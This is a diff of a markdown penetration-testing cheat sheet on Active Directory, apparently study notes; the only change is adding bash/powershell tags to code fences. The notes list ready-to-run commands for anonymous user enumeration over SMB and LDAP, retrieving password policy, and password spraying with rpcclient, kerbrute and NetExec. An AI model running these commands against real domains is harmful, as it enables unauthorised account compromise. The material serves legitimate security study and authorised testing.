@@ -22,31 +22,31 @@
 ---
 ## User Enumeration
 
-```
+```bash
 rpcclient -U "" -N <dc-ip>
 ```
 
 Connect anonymously via SMB NULL session. Run `enumdomusers` inside the session to dump the full user list, `querydominfo` to retrieve domain info.
 
-```
+```bash
 enum4linux -U <dc-ip> | grep "user:"
 ```
 
 Enumerate users via SMB NULL session and filter output to usernames only.
 
-```
+```bash
 nxc smb <dc-ip> --users
 ```
 
 Enumerate domain users via NetExec without credentials.
 
-```
+```bash
 ./windapsearch.py --dc-ip <dc-ip> -u "" -U
 ```
 
 Query LDAP anonymously to retrieve the user list. `-u ""` specifies anonymous access, `-U` retrieves users only. LDAP anonymous binds are disabled by default since Windows Server 2003 but still appear in legacy environments.
 
-```
+```bash
 ldapsearch -h <dc-ip> -x -b "DC=<domain>,DC=<tld>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ```
 
@@ -57,13 +57,13 @@ Raw LDAP anonymous query. Useful when windapsearch is unavailable or for manual 
 
 >**Linux:**
 
-```
+```bash
 enum4linux -P <dc-ip>
 ```
 
 Enumerate password policy via SMB NULL session. Use before spraying to determine lockout threshold.
 
-```
+```bash
 nxc smb <dc-ip> -u <user> -p <password> --pass-pol
 ```
 
@@ -71,13 +71,13 @@ Retrieve password policy with valid credentials via NetExec. `--pass-pol` pulls 
 
 >**Windows:**
 
-```
+```powershell
 net accounts
 ```
 
 Retrieve the domain password policy from a domain-joined Windows host. No additional tools required.
 
-```
+```powershell
 net use \\<dc>\ipc$ "" /u:""
 ```
 
@@ -88,17 +88,17 @@ Establish an anonymous SMB NULL session from a Windows host. Used as a prerequis
 
 >**Linux:**
 
-```
+```bash
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 
-```
+```bash
 kerbrute passwordspray -d <domain> --dc <dc-ip> <valid-users-file> <password>
 ```
 
 Spray a single password against a validated user list via Kerberos. Generates less noise than SMB-based spraying. `-d` specifies the domain, `--dc` specifies the domain controller IP.
 
-```
+```bash
 sudo nxc smb <dc-ip> -u <valid-users-file> -p <password> | grep +
 ```
 
